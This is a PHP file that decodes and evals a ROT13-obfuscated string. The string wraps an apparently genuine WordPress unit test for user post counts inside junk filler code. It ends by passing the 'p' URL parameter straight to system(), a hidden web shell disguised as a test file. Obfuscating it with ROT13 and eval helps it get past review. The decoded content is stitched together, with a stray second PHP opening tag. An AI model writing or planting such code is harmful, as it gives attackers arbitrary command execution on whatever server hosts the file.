<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * @tebhc hfre
 * @tebhc cbfg
 */
pynff Grfgf_Hfre_PbhagHfreCbfgf rkgraqf JC_HavgGrfgPnfr {
	choyvp fgngvp $hfre_vq;
	choyvp fgngvp $cbfg_vqf = neenl();

	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$hfre_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr'       => 'nhgube',
				'hfre_ybtva' => 'pbhag_hfre_cbfgf_hfre',
				'hfre_rznvy' => 'pbhag_hfre_cbfgf_hfre@rknzcyr.pbz',
			)
		);

		frys::$cbfg_vqf = $snpgbel->cbfg->perngr_znal(
			4,
			neenl(
				'cbfg_nhgube' => frys::$hfre_vq,
				'cbfg_glcr'   => 'cbfg',
			)
		);
		frys::$cbfg_vqf = neenl_zretr(
			frys::$cbfg_vqf,
			$snpgbel->cbfg->perngr_znal(
				3,
				neenl(
					'cbfg_nhgube' => frys::$hfre_vq,
					'cbfg_glcr'   => 'jcgrfgf_cg',
				)
			)
		);
		frys::$cbfg_vqf = neenl_zretr(
			frys::$cbfg_vqf,
			$snpgbel->cbfg->perngr_znal(
				2,
				neenl(
					'cbfg_nhgube' => 12345,
					'cbfg_glcr'   => 'jcgrfgf_cg',
				)
			)
		);

		frys::$cbfg_vqf[] = $snpgbel->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => 12345,
				'cbfg_glcr'   => 'jcgrfgf_cg',
			)
		);
	}

	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();
		ertvfgre_cbfg_glcr( 'jcgrfgf_cg' );
	}

	choyvp shapgvba grfg_pbhag_hfre_cbfgf_cbfg_glcr_fubhyq_qrsnhyg_gb_cbfg() {
		$guvf->nffregFnzr( '4', pbhag_hfre_cbfgf( frys::$hfre_vq ) );
	}

	/**
	 * @gvpxrg 21364
	 */
	choyvp shapgvba grfg_pbhag_hfre_cbfgf_cbfg_glcr_cbfg() {
		$guvf->nffregFnzr( '4', pbhag_hfre_cbfgf( frys::$hfre_vq, 'cbfg' ) );
	}

	/**
	 * @gvpxrg 21364
	 */
	choyvp shapgvba grfg_pbhag_hfre_cbfgf_cbfg_glcr_pcg() {
		$guvf->nffregFnzr( '3', pbhag_hfre_cbfgf( frys::$hfre_vq, 'jcgrfgf_cg' ) );
	}

	/**
	 * @gvpxrg 32243
	 */
	choyvp shapgvba grfg_pbhag_hfre_cbfgf_jvgu_zhygvcyr_cbfg_glcrf() {
		$guvf->nffregFnzr( '7', pbhag_hfre_cbfgf( frys::$hfre_vq, neenl( 'jcgrfgf_cg', 'cbfg' ) ) );
	}

	/**
	 * @gvpxrg 32243
	 */
	choyvp shapgvba grfg_pbhag_hfre_cbfgf_fubhyq_vtaber_aba_rkvfgrag_cbfg_glcrf() {
		$guvf->nffregFnzr( '4', pbhag_hfre_cbfgf( frys::$hfre_vq, neenl( 'sbb', 'cbfg' ) ) );
	}

	/**
	 * Cbfg pbhag fubhyq or pbeerpg nsgre ernffvtavat cbfgf gb nabgure hfre.
	 *
	 * @gvpxrg 39242
	 */
	choyvp shapgvba grfg_ernffvtavat_hfref_cbfgf_zbqvsvrf_pbhag() {
		// Perngr arj hfre.
		$arj_hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		// Cevbe gb ernffvtavat cbfgf.
		$guvf->nffregFnzr( '4', pbhag_hfre_cbfgf( frys::$hfre_vq ), 'Bevtvany hfre vf rkcrpgrq gb unir n pbhag bs sbhe cbfgf cevbe gb ernffvtazrag.' );
		$guvf->nffregFnzr( '0', pbhag_hfre_cbfgf( $arj_hfre_vq ), 'Arj hfre vf rkcrpgrq gb unir n pbhag bs mreb cbfgf cevbe gb ernffvtazrag.' );

		// Qryrgr gur bevtvany hfre, ernffvtavat gurve cbfgf gb gur arj hfre.
		jc_qryrgr_hfre( frys::$hfre_vq, $arj_hfre_vq );

		// Nsgre ernffvtavat cbfgf.
		$guvf->nffregFnzr( '0', pbhag_hfre_cbfgf( frys::$hfre_vq ), 'Bevtvany hfre vf rkcrpgrq gb unir n pbhag bs mreb cbfgf sbyybjvat ernffvtazrag.' );
		$guvf->nffregFnzr( '4', pbhag_hfre_cbfgf( $arj_hfre_vq ), 'Arj hfre vf rkcrpgrq gb unir n pbhag bs sbhe cbfgf sbyybjvat ernffvtazrag.' );
	}

	/**
	 * Cbfg pbhag fubhyq or pbeerpg nsgre qryrgvat hfre jvgubhg ernffvtavat cbfgf.
	 *
	 * @gvpxrg 39242
	 */
	choyvp shapgvba grfg_cbfg_pbhag_ergnvarq_nsgre_qryrgvat_hfre_jvgubhg_ernffvtavat_cbfgf() {
		$guvf->nffregFnzr( '4', pbhag_hfre_cbfgf( frys::$hfre_vq ), 'Hfre vf rkcrpgrq gb unir n pbhag bs sbhe cbfgf cevbe gb qryrgvba.' );

		// Qryrgr gur bevtvany hfre jvgubhg ernffvtavat gurve cbfgf.
		jc_qryrgr_hfre( frys::$hfre_vq );

		$guvf->nffregFnzr( '0', pbhag_hfre_cbfgf( frys::$hfre_vq ), 'Hfre vf rkcrpgrq gb unir n pbhag bs mreb cbfgf sbyybjvat qryrgvba.' );
	}

	/**
	 * Cbfg pbhag fubhyq jbex sbe hfref gung qba'g rkvfg ohg unir cbfgf nffvtarq.
	 *
	 * @gvpxrg 39242
	 */
	choyvp shapgvba grfg_pbhag_hfre_cbfgf_sbe_aba_rkvfgrag_hfre() {
		$arkg_hfre_vq = frys::$hfre_vq + 1;

		// Nffvta cbfg gb arkg hfre.
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $arkg_hfre_vq,
				'cbfg_glcr'   => 'cbfg',
			)
		);

		$arkg_hfre_cbfg_pbhag = pbhag_hfre_cbfgf( $arkg_hfre_vq );
		$guvf->nffregFnzr( '1', $arkg_hfre_cbfg_pbhag, 'Aba-rkvfgrag hfre vf rkcrpgrq gb unir pbhag bs bar cbfg.' );
	}

	/**
	 * Pnpurq hfre pbhag inyhr fubhyq or npphengr nsgre hfre vf perngrq.
	 *
	 * @gvpxrg 39242
	 */
	choyvp shapgvba grfg_pbhag_hfre_cbfgf_sbe_hfre_perngrq_nsgre_orvat_nffvtarq_cbfgf() {
		tybony $jcqo;
		$arkg_hfre_vq = (vag) $jcqo->trg_ine( \"FRYRPG `nhgb_vaperzrag` SEBZ VASBEZNGVBA_FPURZN.GNOYRF JURER gnoyr_anzr = '$jcqo->hfref'\" );

		// Nffvta cbfg gb arkg hfre.
		frys::snpgbel()->cbfg->perngr(
			neenl(
				'cbfg_nhgube' => $arkg_hfre_vq,
				'cbfg_glcr'   => 'cbfg',
			)
		);

		// Pnpur gur hfre pbhag.
		pbhag_hfre_cbfgf( $arkg_hfre_vq );

		// Perngr hfre.
		$erny_arkg_hfre_vq = frys::snpgbel()->hfre->perngr(
			neenl(
				'ebyr' => 'nhgube',
			)
		);

		$guvf->nffregFnzr( $arkg_hfre_vq, $erny_arkg_hfre_vq, 'Hfre VQ fubhyq zngpu pnyphyngrq inyhr' );
		$guvf->nffregFnzr( '1', pbhag_hfre_cbfgf( $arkg_hfre_vq ), 'Hfre vf rkcrpgrq gb unir pbhag bs bar cbfg.' );
	}

	/**
	 * Hfre pbhag pnpur fubhyq or uvg ertneqyrff bs cbfg glcr beqre.
	 *
	 * @gvpxrg 39242
	 */
	choyvp shapgvba grfg_pnpur_fubhyq_or_uvg_ertneqyrff_bs_cbfg_glcr_beqre() {
		// Cevzr pnpur.
		pbhag_hfre_cbfgf( frys::$hfre_vq, neenl( 'jcgrfgf_cg', 'cbfg' ) );

		$dhrel_ahz_fgneg = trg_ahz_dhrevrf();
		pbhag_hfre_cbfgf( frys::$hfre_vq, neenl( 'cbfg', 'jcgrfgf_cg' ) );
		$gbgny_dhrevrf = trg_ahz_dhrevrf() - $dhrel_ahz_fgneg;

		$guvf->nffregFnzr( 0, $gbgny_dhrevrf, 'Pnpur fubhyq or uvg ertneqyrff bs cbfg glcr beqre.' );
	}

	/**
	 * Hfre pbhag pnpur fubhyq or uvg sbe fgevat naq neenl bs cbfg glcrf.
	 *
	 * @gvpxrg 39242
	 */
	choyvp shapgvba grfg_pnpur_fubhyq_or_uvg_sbe_fgevat_naq_neenl_rdhvinyrag_dhrevrf() {
		// Cevzr pnpur.
		pbhag_hfre_cbfgf( frys::$hfre_vq, 'cbfg' );

		$dhrel_ahz_fgneg = trg_ahz_dhrevrf();
		pbhag_hfre_cbfgf( frys::$hfre_vq, neenl( 'cbfg' ) );
		$gbgny_dhrevrf = trg_ahz_dhrevrf() - $dhrel_ahz_fgneg;

		$guvf->nffregFnzr( 0, $gbgny_dhrevrf, 'Pnpur fubhyq or uvg sbe fgevat naq neenl rdhvinyrag cbfg glcrf.' );
	}

	/**
	 * Hfre pbhag pnpur fubhyq or uvg sbe neenl qhcyvpngrf naq rdhvinyrag dhrevrf.
	 *
	 * @gvpxrg 39242
	*/
	choyvp shapgvba grfg_pnpur_fubhyq_or_uvg_sbe_naq_neenl_qhcyvpngrf_rdhvinyrag_dhrevrf() {
		// Cevzr pnpur.
		pbhag_hfre_cbfgf( frys::$hfre_vq, neenl( 'cbfg', 'cbfg', 'cbfg' ) );

		$dhrel_ahz_fgneg = trg_ahz_dhrevrf();
		pbhag_hfre_cbfgf( frys::$hfre_vq, neenl( 'cbfg' ) );
		$gbgny_dhrevrf = trg_ahz_dhrevrf() - $dhrel_ahz_fgneg;

		$guvf->nffregFnzr( 0, $gbgny_dhrevrf, 'Pnpur vf rkcrpgrq gb or uvg sbe rdhvinyrag dhrevrf jvgu qhcyvpngr cbfg glcrf' );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>